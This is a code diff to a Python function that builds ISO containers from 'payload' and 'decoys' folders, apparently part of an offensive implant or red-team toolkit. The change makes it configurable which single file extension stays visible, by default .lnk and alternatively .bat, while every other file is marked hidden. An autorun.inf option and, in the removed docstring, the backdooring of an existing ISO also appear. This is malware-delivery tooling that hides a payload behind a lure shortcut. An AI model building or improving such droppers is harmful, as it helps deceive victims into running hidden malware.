@@ -8,27 +8,17 @@ DEFAULT_ROOT = REPO_ROOT / "agent_code"
 def build_iso(volume_id: str = "SYSTEM",
               enable_autorun: bool = True,
               source_iso: pathlib.Path = None,
-              build_path: pathlib.Path = None) -> pathlib.Path:
+              build_path: pathlib.Path = None,
+              visible_extension: str = ".lnk") -> pathlib.Path:
     """
-    Generates an ISO container.
+    Generates an ISO container with strict file visibility control.
 
-    :param volume_id: ISO volume name (appears in explorer).
-    :type volume_id: str
-    :param enable_autorun: Include autorun.inf for auto-execution hints.
-    :type enable_autorun: bool
-    :param source_iso: Optional Path to an existing ISO to backdoor.
-    :type source_iso: pathlib.Path
-    :param build_path: The build path of the current build process.
-    :type build_path: pathlib.Path
-    :return: Returns Path to the generated ISO.
-    :rtype: Path
+    :param visible_extension: The ONLY extension to keep visible (e.g., ".lnk", ".bat"). All others are hidden.
     """
     root_dir = build_path if build_path else DEFAULT_ROOT
     container_dir = root_dir / "container"
     payload_dir = root_dir / "payload"
     decoy_dir = root_dir / "decoys"
-
-    VISIBLE_EXTENSIONS = {'.lnk'}
 
     try:
         for item in decoy_dir.rglob('*'):
@@ -56,7 +46,6 @@ Icon=shell32.dll,4
 
         archive_path = container_dir / "iso" / output_name
         archive_path.parent.mkdir(parents=True, exist_ok=True)
-
         iso = PyCdlib()
 
         if source_iso and source_iso.exists():
@@ -69,8 +58,7 @@ Icon=shell32.dll,4
                 vol_ident=volume_id
             )
 
-        files_to_hide= []
-
+        files_to_hide = []
         for item in payload_dir.rglob('*'):
             if any(part.startswith('.') for part in item.relative_to(payload_dir).parts):
                 continue
@@ -86,10 +74,8 @@ Icon=shell32.dll,4
                     joliet_path=iso_path,
                     rr_name=filename_str
                 )
-
-            if (item.suffix.lower() not in VISIBLE_EXTENSIONS):
-                files_to_hide.append(iso_path)
-
+                if item.suffix.lower() != visible_extension.lower():
+                    files_to_hide.append(iso_path)
         for h_file in files_to_hide:
             try:
                 iso.set_hidden(joliet_path=h_file)
